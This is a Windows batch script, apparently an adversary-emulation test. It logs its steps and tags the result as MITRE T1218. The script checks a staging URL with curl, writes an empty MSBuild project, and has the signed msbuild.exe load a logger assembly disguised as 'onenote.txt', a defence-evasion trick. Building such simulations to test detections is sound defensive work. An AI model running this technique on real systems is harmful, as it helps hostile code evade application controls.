@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET tsvar=!DATE! !TIME!
SET vvms=%APPDATA%\9783\335ce905
SET lqdz=https://10.0.0.49
SET wgop=https://10.0.0.49/stage/2/icon.png?9783-7
SET bxsp=ITZEL-S2B
SET dpwr=7
SET gfvh=onenote.txt
SET knqr=9783
SET logfile=%APPDATA%\!dpwr!\macula-simulations.log
SET result=0
SET err=

echo [!tsvar!][DEBUG][!bxsp!][!knqr!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!wgop!"
if not errorlevel 1 (
  SET result=1
  echo [!tsvar!][DEBUG][!bxsp!][!knqr!]: heartbeat_result=1>> "!logfile!" 2>nul
) else (
  SET err=connection_failed
  echo [!tsvar!][DEBUG][!bxsp!][!knqr!]: heartbeat_result=0>> "!logfile!" 2>nul
)

echo [!tsvar!][DEBUG][!bxsp!][!knqr!]: chdir_start>> "!logfile!" 2>nul
cd /d "!vvms!" >nul 2>&1
if errorlevel 1 (
  SET err=dir_access_denied
  echo [!tsvar!][DEBUG][!bxsp!][!knqr!]: chdir_result=0>> "!logfile!" 2>nul
) else (
  echo [!tsvar!][DEBUG][!bxsp!][!knqr!]: chdir_result=1>> "!logfile!" 2>nul
)

if !result! equ 1 (
  echo [!tsvar!][DEBUG][!bxsp!][!knqr!]: msbuild_file_start>> "!logfile!" 2>nul
  echo ^<Project/^> > "build.proj"
  if not errorlevel 1 (
    echo [!tsvar!][DEBUG][!bxsp!][!knqr!]: msbuild_file_result=1>> "!logfile!" 2>nul
  ) else (
    SET err=file_creation_failed
    echo [!tsvar!][DEBUG][!bxsp!][!knqr!]: msbuild_file_result=0>> "!logfile!" 2>nul
    SET result=0
  )
)

if !result! equ 1 (
  echo [!tsvar!][DEBUG][!bxsp!][!knqr!]: msbuild_start>> "!logfile!" 2>nul
  %SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "build.proj" /logger:LoggerEntry,"!vvms!\!gfvh!";MyParameters,Foo >NUL 2>&1
  if not errorlevel 1 (
    echo [!tsvar!][DEBUG][!bxsp!][!knqr!]: msbuild_result=1>> "!logfile!" 2>nul
    SET result=1
  ) else (
    SET err=assembly_load_failed
    echo [!tsvar!][DEBUG][!bxsp!][!knqr!]: msbuild_result=0>> "!logfile!" 2>nul
    SET result=0
  )
)

echo [!tsvar!][TTP][!bxsp!][!knqr!]: T1218|Signed Binary Proxy Execution=!result!::!err!>> "!logfile!" 2>nul
ENDLOCAL